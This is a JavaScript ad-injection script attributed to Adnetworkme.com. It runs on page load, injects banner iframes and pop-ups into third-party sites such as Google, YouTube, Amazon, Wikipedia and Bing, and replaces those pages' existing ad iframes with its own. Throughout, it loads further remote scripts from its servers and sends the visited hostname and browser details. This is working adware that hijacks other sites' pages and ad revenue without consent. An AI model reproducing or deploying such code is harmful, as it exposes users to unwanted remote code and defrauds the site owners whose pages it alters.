/*!
Copyright 2013 Sami Asby | Adnetworkme.com All rights reserved.
16.07.2013 | Ver 1.03
*/
function add_floatside(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvfloat.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    //script.src = "http://srv3.adnetworkme.com/srvfloat.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_floatTwoSides(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvfloatSides.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_floattop(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvtopb.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}

function add_floatdsn(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvfloat-dsnr.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_preload(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvpreload.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_catfish(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvcatfish.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_catfishHome2(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvcatfishHomeX.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_catfishHome(){
    try{
    var script = document.createElement('script');
    //script.src = "http://srv3.adnetworkme.com/srvcatfishHome.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    script.src = "http://www.flashgames800.info/SR/adnet/S.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_toolbar(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvToolBar.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_pop2(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvpop2.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function add_pop(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/srvpop.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function main_fnn(){
    try{
    var script = document.createElement('script');
    script.src = "http://srv3.adnetworkme.com/Main.php?prm="+encodeURIComponent(window.location.hostname)+"&w="+screen.width;
    document.getElementsByTagName('head')[0].appendChild(script);
    }
    catch(e){}
}
function get_bnr_url(w){
    /// Dedictaed  Brwser
    var objappVersion = navigator.appVersion; var objAgent = navigator.userAgent; var objbrowserName  = navigator.appName; var objfullVersion  = ''+parseFloat(navigator.appVersion); var objBrMajorVersion = parseInt(navigator.appVersion,10); var objOffsetName,objOffsetVersion,ix;  if ((objOffsetVersion=objAgent.indexOf("Chrome"))!=-1) {  objbrowserName = "Chrome";  objfullVersion = objAgent.substring(objOffsetVersion+7); } else if ((objOffsetVersion=objAgent.indexOf("MSIE"))!=-1) {  objbrowserName = "MSIE";  objfullVersion = objAgent.substring(objOffsetVersion+5); }  else if ((objOffsetVersion=objAgent.indexOf("Firefox"))!=-1) {  objbrowserName = "Firefox"; } else if ((objOffsetVersion=objAgent.indexOf("Safari"))!=-1) {  objbrowserName = "Safari";  objfullVersion = objAgent.substring(objOffsetVersion+7);  if ((objOffsetVersion=objAgent.indexOf("Version"))!=-1)    objfullVersion = objAgent.substring(objOffsetVersion+8); } else if ( (objOffsetName=objAgent.lastIndexOf(' ')+1) <           (objOffsetVersion=objAgent.lastIndexOf('/')) ) {  objbrowserName = objAgent.substring(objOffsetName,objOffsetVersion);  objfullVersion = objAgent.substring(objOffsetVersion+1);  if (objbrowserName.toLowerCase()==objbrowserName.toUpperCase()) {   objbrowserName = navigator.appName;  } } if ((ix=objfullVersion.indexOf(";"))!=-1)    objfullVersion=objfullVersion.substring(0,ix); if ((ix=objfullVersion.indexOf(" "))!=-1)    objfullVersion=objfullVersion.substring(0,ix);  objBrMajorVersion = parseInt(''+objfullVersion,10); if (isNaN(objBrMajorVersion)) {  objfullVersion  = ''+parseFloat(navigator.appVersion);  objBrMajorVersion = parseInt(navigator.appVersion,10); }

    var n = new Date().getSeconds();
    if ( w == 728 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=728&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 300 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=300&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 336 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=336&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 120 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=120&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 468 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=468&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 160 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=160&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 250 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=250&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 234 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=234&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 970 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=970&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 200 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=200&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 125 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=125&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
    else if ( w == 180 ){
        return 'http://srv1.adnetworkme.com/ifr.php?s=180&web='+encodeURIComponent(window.location.hostname)+'&prm='+encodeURIComponent(window.location.hostname)+'&brow='+objbrowserName;
    }
}

function bnr_err(){
    try{
        this.style.visibility = "hidden";
    }
    catch(e){
    }
}
function bnr_add_to_dom(par,w,h,m){
    try{
    var ndiv = document.createElement('div');
    var pElement = document.getElementById(par);
    ndiv.id = 'dban';

    var c = '<center>';
    var ce = '</center>';
    var mt = '';
    if ( typeof(m) != 'undefined' )
        mt = ' style=\'margin-left:'+m+'px\' ';
    ndiv.innerHTML = c+'<iframe style=\'border:0;\' onerror=\'bnr_error();\' scrolling=\'no\' '+mt+' frameborder=\'0\' width=\''+w+'\' height=\''+h+'\' marginheight=\'0\' marginwidth=\'0\' src=\''+get_bnr_url(w)+'\'></iframe>'+ce;

    pElement.insertBefore(ndiv, pElement.firstChild);
    }
    catch(e){}
}

function replace_iframes(){
    try{
    var iframes = document.getElementsByTagName('iframe');
    for ( var i=0;i<iframes.length;i++)
    {
        if ( iframes[i].width == 728 )
            iframes[i].src = get_bnr_url(728);
        else if ( iframes[i].width == 300 )
            iframes[i].src = get_bnr_url(300);
        else if ( iframes[i].width == 336 )
            iframes[i].src = get_bnr_url(336);
        else if ( iframes[i].width == 120 )
            iframes[i].src = get_bnr_url(120);
        else if ( iframes[i].width == 468 )
            iframes[i].src = get_bnr_url(468);
        else if ( iframes[i].width == 160 )
            iframes[i].src = get_bnr_url(160);
        else if ( iframes[i].width == 250 )
            iframes[i].src = get_bnr_url(250);

        else if ( iframes[i].width == 234 )
            iframes[i].src = get_bnr_url(234);
        else if ( iframes[i].width == 970 )
            iframes[i].src = get_bnr_url(970);
        else if ( iframes[i].width == 200 )
            iframes[i].src = get_bnr_url(200);
        else if ( iframes[i].width == 125 )
            iframes[i].src = get_bnr_url(125);
        else if ( iframes[i].width == 180 )
            iframes[i].src = get_bnr_url(180);
    }
    } catch(e){}
}

function replace_img_banners(){
    try{
    var imgs = document.getElementsByTagName('img');
    for ( var i=0;i<imgs.length;i++)
    {
        switch ( imgs[i].width )
        {
            case 728:
                if ( imgs[i].height != 90 )
                    continue;
            case 300:
                if ( imgs[i].height != 250 )
                    continue;
            case 336:
                if ( imgs[i].height != 280 )
                    continue;

            case 120:
                if (( imgs[i].height != 90 ) && ( imgs[i].height != 240 ) )
                    continue;

            case 468:
                if ( imgs[i].height != 60 )
                    continue;

            case 160:
                if ( imgs[i].height != 600 )
                    continue;

            case 250:
            {
                var xmlhttp=new XMLHttpRequest();
                xmlhttp.item = imgs[i];
                xmlhttp.onreadystatechange = function() {
                    if (xmlhttp.readyState === 4){
                        try{
                        var obj = JSON.parse(xmlhttp.responseText);
                        this.item.src = obj.img;
                        this.item.parentNode.href = obj.url;

                        }catch(e){}
                    }
                };
                xmlhttp.open('GET', 'http://srv3.adnetworkme.com/srvimg.php?s='+imgs[i].width, true);
                xmlhttp.send(null);
            }
                break;

        }
    }
    } catch(e){}
}

function is_supported_site(site){
    var domain = site.replace('http://','').replace('https://','').split(/[/?#]/)[0];
    domain = domain.replace('www.','');

    // Exclude domains
    var domainsExclude = ['al3abcenter.com', 'el3abnow.com', 'adnetworkme.com', 'racingflashgames9090.info', 'araby-dir.info', 'arabymotors.com','speedserv.info', 'flashgames1010.info', 'flashgames-dojo.info', 'flash-games10.info','al3ab100.info', 'flashgames400.info','adzoola.info','playfreegames55.info','flash-games-racing.info','flash-games-dojo.info','arab-racing-flashgames.info','flashgames6660.info','flashgames-nexus.info','racingflashgamez.info','racinggames505.info','motor-flashgames.info','epic-racinggames.info','epicfreegames.info','epic-racing-games.info','best-racing-games.info','flash-gaming.info','flash-game-dojo.info','flash-games-nexus.info','warflashgames.info','flashgames1000.info','racingflashgames1000.info','adz4all.info', 'flashgames4arab.info', 'arab-racing-flash-games.info', 'racing-flash-games.info','top-racing-games.info','arabflashgames.info','racinggames404.info', 'arab-online-directory.info','buy-sell-cars.info','racingflashgames20.com','flashgames404.info', 'top-racing-flash-games.com','download-free-softwares.info', 'world-hotels-reviews.info','free-hotels-reviews.info','free-softwares.info','download-free-softwares.info','download-softwares.info','ro-flash-games.com', 'flashgames9090.com', 'adnetplus.info', 'falconbrowser.com', 'playflashgames900.com','racingflashgames100.info', 'gameflash500.info', 'adnetworkus.com','adsnetworkfeed.info','superflashgames.info','kidsflashgames.info','classflashgames.info','motorflashgames.info','autoflashgames.info','flashgames400.info','flashgames500.info','srv1.adnetworkme.com', 'markets.com', 'ufxmarkets.com','adservingfree.info','srv2.adnetworkme.com', 'srv3.adnetworkme.com', 'topal3ab.com', 'picsaty.com', 'yoz5.info', 'ozfreegames.info', '18sec.com', 'play882.info', 'myarabook.com', 'playgames2020.com', 'akicdn.com', 'arabydir.info', 'oldflashgames.info', 'plyflashgames.info', 'flashgamezer.info', 'flashgames800.info', 'flashgames100.info', 'motorsflashgames.info', 'carsflashgames.info', 'adzoook.com', 'marioflashgame.info', 'plyflashgames.info', 'motorarticles.info', 'adzdex.com', 'games44.info', 'o-match.com', 'ftparab.info', 'autosplus.info', 'flashgames4u.info', 'adnixex.com', 'volarotech.com', 'zazpix.info', 'flashgames4all.info', 'globalfreegames.com', 'cloudgamezer.com', 'funnygamezer.info', 'bestracingames.info', 'playbestflashgames.info', 'lidaflashgames.info', 'top-flash-games.info', '2flash-games.info', 'fun-flash-games.info', 'flashgamesnexus.info', 'adnetwork100.info', 'speedflashgames.info','gamezerflash.info','playflashgamezer.info','play-racing-games.info','play-flash-games.info','play-kids-games.info', 'gamesgofree.info', 'flashgamedojo.info', 'flash-games-arcade.info', 'diamondgames.info', 'world4ads.info', 'flashgames6060.com', 'nice4dx.info', 'cars-racing-games.info', 'epicgames4all.info', 'sedoo.info', 'c5u.info', 'ftparaby.com', 'azd3.info', 'playgamezers.com', 'adxen.com', 'funnygamezer.com', 'kidsgames7070.com', 'palestinegames.info', 'arabsdirectory.info', 'palgames.info', 'forexarticles.info', 'flashgames888.info', 'zulagames.info', 'oldflashgames.info', 'racingflashgames.info', 'euroflashgames.info', 'adzek.info', 'epicgameads.com', '26sec.com', 'oracle-blogs.com', 'playgame600.com', 'playgame600.com', 'freegamesarticles.info', 'gamesarticles.info', 'gameforfree.info', 'playflashgames20.com', 'zackgames.com', 'epictopgames.com', '18sec.com', 'araboola.com', 'forexyard.com', 'arabyfan.com', 'acdcads.com', 'playflashgames444.com', 'akhbar123.com', 'arabylife.com', 'arabysouq.com', '3indubai.com', 'arabyvideos.com', 'araby4soft.com', 'rawabetarab.com', 'lidyagames.com', 'playgames555.com', 'arabs-links.com', 'arabsimmigrants.com', 'gemzaty.com', 'alarabeyes.com', 'top555games.com', 'gemzatop.com', 'freearabsofts.com', 'hawaaweb.com', 'topgames88.com', 'freegames88.com', 'flashgames333.com', 'playflashgames100.com', 'playgamesonline100.com', 'topracingames.com', 'arabic-directory.com', 'adscoo.com', 'arabyonline.com', 'games.arabyonline.com', 'dreams.arabyonline.com', 'islam.arabyonline.com', 'calc.arabyonline.com', 'news.arabyonline.com', 'eve.arabyonline.com', 'gamezer55.com', 'tr-flashgames.com', 'newsaraby.com', 'finance.arabyonline.com', 'names.arabyonline.com', 'horoscope.arabyonline.com', 'weather.arabyonline.com', 'tech.arabyonline.com', 'auto.arabyonline.com', 'sport.arabyonline.com', 'arabytech.com', 'travel.arabyonline.com', 'my-rss-feeds.com', 'arb77.com', 'xxxaporn.com', 'xnxxtoday.net', 'xxxtrooper.com', 'arabsexvideo.net','ixxx.com', 'arbgames77.com', 'gamezer300.com', 'newsaraby.com', 'arabyauto.com', 'egyptyonline.com', 'al3ab10.com', 'arabyonline.com', 'hardsextube.com', 'xnxx.com', 'xnxxmovies.com', 'xxlhub.com', 'pornmaki.com', 'absoluteporntube.com', 'xnxxhdtube.com', 'xxx.com', 'yepporn.com', 'pornxxxhub.com', '4tube.com', 'tube8.com', 'mozaxx.com', 'adultsexgames.xxx', 'entire.xxx', 'fr.cam4.com', 'cam4.com', 'rexxx.com', '220tube.com', '8teenxxx.com', 'xnxxfree.net', 'xxxnx.eu', 'youporn.com', 'hq-sex-tube.com', 'redtube.com', 'en.entire.xxx', 'xnxxmoviesx.com', 'xxxtubexxx.net', 'xxlnow.com', 'tubepornfilm.com', '1arabporntube.com', 'arabporntubes.com', 'sunporno.com', 'porn.com', 'xvideos.com', 'indianxxxvideo.net', 'xxxbunker.com', 'hd-xvideos.com', 'hellporno.com', 'gandalfporn.com', 'mypornmotion.com', 'alphaporno.com', 'hotpornshow.com', 'ooo-sex.com', 'pakistanisextube.org', 'arabsex12.com', 'worldsex.com', 'hugesex.tv', 'xnxxxnx.info', 'zerofreeporn.com', 'xxxpornx.xxx', 'hqxnxx.com', 'pornhub.com', 'gonzoxxxmovies.com', 'xxxxsextube.com', 'giantxxxtube.com', 'dirtyxxxtube.com', 'tubexxx1.com', 'xxxltube.com', 'xnxxporn1.com', 'perfectgirls.xxx', 'sextubehd.xxx', 'redtube-xxx.tv', 'lightxxx.com', 'pornosexxxtits.com', 'xxxn.eu', 'xhamster.com', 'xnxx.bz', 'hot-sex-tube.com', 'anysex.com', 'ohfreesex.com', 'videosexarchive.com', '1arabsextube.com', 'thesexdump.com', 'sexarabtube.org', 'sexlew.com', 'hibasex.com', 'sex-hq.com', 'sex.com', 'h2porn.com', 'video.xnxx.com', 'fr.perfectgirls.net', 'arabsextubes.net', 'pornerbros.com', 'happy-porn.com', 'pornoxo.com', 'vporn.com', 'pussyxnxx.com', 'perfectgirls.net', 'porntube1.xxx', 'pornoxo.com', 'porntube.com', 'hornbunny.com', 'giantsextube.com'];
    if (!Array.prototype.indexOf) {
        Array.prototype.indexOf = function (domain,domainsExclude) {
            var len = this.length >>> 0;
            var from = Number(arguments[1]) || 0;
            from = (from < 0) ? Math.ceil(from) : Math.floor(from);
            if (from < 0) from += len;

            for (; from < len; from++) {
                if (from in this && this[from] === domain) return from;
            }
            return -1;
        };
    }
    if(domain=='hornbunny.com' || domain=='xhamster.com' || domain=='xnxx.com' || domain=='xxxaporn.com' || domain=='xnxxtoday.net' || domain=='xxxtrooper.com' || domain=='arabsexvideo.net' || domain=='ixxx.com' || domain=='hardsextube.com' || domain=='xnxxmovies.com' || domain=='xxlhub.com' || domain=='pornmaki.com' || domain=='absoluteporntube.com' || domain=='xnxxhdtube.com' || domain=='xxx.com' || domain=='yepporn.com' || domain=='pornxxxhub.com' || domain=='4tube.com' || domain=='tube8.com' || domain=='mozaxx.com' || domain=='adultsexgames.xxx' || domain=='entire.xxx' || domain=='fr.cam4.com' || domain=='cam4.com' || domain=='rexxx.com' || domain=='220tube.com' || domain=='8teenxxx.com' || domain=='xnxxfree.net' || domain=='xxxnx.eu' || domain=='youporn.com' || domain=='hq-sex-tube.com' || domain=='redtube.com' || domain=='en.entire.xxx' || domain=='xnxxmoviesx.com' || domain=='xxxtubexxx.net' || domain=='xxlnow.com' || domain=='tubepornfilm.com' || domain=='1arabporntube.com' || domain=='arabporntubes.com' || domain=='sunporno.com' || domain=='porn.com' || domain=='indianxxxvideo.net' || domain=='xxxbunker.com' || domain=='hd-xvideos.com' || domain=='hellporno.com' || domain=='gandalfporn.com' || domain=='mypornmotion.com' || domain=='alphaporno.com' || domain=='hotpornshow.com' || domain=='ooo-sex.com' || domain=='pakistanisextube.org' || domain=='arabsex12.com' || domain=='worldsex.com' || domain=='hugesex.tv' || domain=='xnxxxnx.info' || domain=='zerofreeporn.com' || domain=='xxxpornx.xxx' || domain=='hqxnxx.com' || domain=='pornhub.com' || domain=='gonzoxxxmovies.com' || domain=='xxxxsextube.com' || domain=='giantxxxtube.com' || domain=='dirtyxxxtube.com' || domain=='tubexxx1.com' || domain=='xxxltube.com' || domain=='xnxxporn1.com' || domain=='perfectgirls.xxx' || domain=='sextubehd.xxx' || domain=='redtube-xxx.tv' || domain=='lightxxx.com' || domain=='pornosexxxtits.com' || domain=='xxxn.eu' || domain=='xnxx.bz' || domain=='hot-sex-tube.com' || domain=='anysex.com' || domain=='ohfreesex.com' || domain=='videosexarchive.com' || domain=='1arabsextube.com' || domain=='thesexdump.com' || domain=='sexarabtube.org' || domain=='sexlew.com' || domain=='hibasex.com' || domain=='sex-hq.com' || domain=='sex.com' || domain=='h2porn.com' || domain=='video.xnxx.com' || domain=='fr.perfectgirls.net' || domain=='arabsextubes.net' || domain=='pornerbros.com' || domain=='happy-porn.com' || domain=='pornoxo.com' || domain=='vporn.com' || domain=='pussyxnxx.com' || domain=='perfectgirls.net' || domain=='porntube1.xxx' || domain=='pornoxo.com' || domain=='porntube.com' || domain=='giantsextube.com' || domain=='xvideos.com' || domain=='sunporno.com'){
        add_pop2();
        add_catfishHome2();
        return;
    }
    var domainsExcludeFlag = domainsExclude.indexOf(domain);

    if(domainsExcludeFlag < 0 ){
        if (( domain.indexOf('google') == 0) && (site.indexOf('q=') == -1) )
            return bnr_add_to_dom('prm-pt',300,250);
        if ( (domain.indexOf('.babylon.com') > -1) && (site.indexOf('q=')==-1))
            bnr_add_to_dom('gTerms',300,250);
        if ( domain.indexOf('search.sweet') > -1)
            bnr_add_to_dom('tagDFP',300,250);
        if ( domain.indexOf('delta-search.com') > -1)
            return bnr_add_to_dom('gTerms',300,250);

        if ( domain.indexOf('youtube.com') > -1){
            bnr_add_to_dom('page',728,90,100);
            bnr_add_to_dom('watch-related',300,250);
            bnr_add_to_dom('guide-container',160,600);
            add_pop();
            return;
        }


        if ( domain.indexOf('yahoo.com') > -1)
        {
            bnr_add_to_dom('masthead',728,90,100);
            add_pop();
            return;
        }

        if ( domain.indexOf('amazon.com') > -1)
        {
            bnr_add_to_dom('navbar',728,90,100);
            add_pop();
            return;
        }

        if ( domain.indexOf('blogspot.com') > -1)
        {
            bnr_add_to_dom('b-navbar',728,90,100);
            add_pop();
            return;
        }
        if ( domain.indexOf('badoo.com') > -1)
        {
            bnr_add_to_dom('head',728,90,100);
            add_pop();
            return;
        }
        if ( domain.indexOf('www.pinoy-ako.info') > -1)
        {
            bnr_add_to_dom('wrapper',728,90,100);
            add_pop();
            return;
        }


        if ( domain.indexOf('thepiratebay.sx') > -1)
        {
            bnr_add_to_dom('fp',728,90);
            bnr_add_to_dom('navlinks',300,250);
            add_pop();
            return;
        }

        
        if ( domain.indexOf('add-anime.net') > -1)
        {
            bnr_add_to_dom('puerto',728,90,100);
            add_pop();
            return;
        }

        if ( domain.indexOf('light-dark.net') > -1)
        {
            bnr_add_to_dom('header',728,90,10);
            add_pop();
            return;
        }
        if ( domain.indexOf('ask.fm') > -1)
        {
            bnr_add_to_dom('menu',728,90,10);
            add_pop();
            return;
        }


        if ( domain.indexOf('www.bing.com') > -1)
        {
            bnr_add_to_dom('sw_hdr',728,90,100);
            add_pop();
            return;
        }

        if ( domain.indexOf('bing.com') > -1)
        {
            bnr_add_to_dom('sw_hdr',728,90,100);
            add_pop();
            return;
        }
        if ( domain.indexOf('search.yahoo.com') > -1)
        {
            bnr_add_to_dom('yucsHead',728,90,100);
            add_pop();
            return;
        }

        if ( domain.indexOf('en.wikipedia.org') > -1)
        {
            bnr_add_to_dom('mw-head',728,90,100);
            add_pop();
            return;
        }
        if ( domain.indexOf('ar.wikipedia.org') > -1)
        {
            bnr_add_to_dom('mw-head',728,90,100);
            add_pop();
            return;
        }
        if ( domain.indexOf('t.co') > -1)
        {
            bnr_add_to_dom('main',728,90,100);
            add_pop();
            return;
        }
        main_fnn();
        replace_iframes();
        //replace_img_banners();
        //add_floatside();
		add_pop();
        add_catfishHome();
        //add_toolbar();
        add_floatTwoSides();
        //add_preload();
    }
    return false;
}
is_supported_site(document.location.href);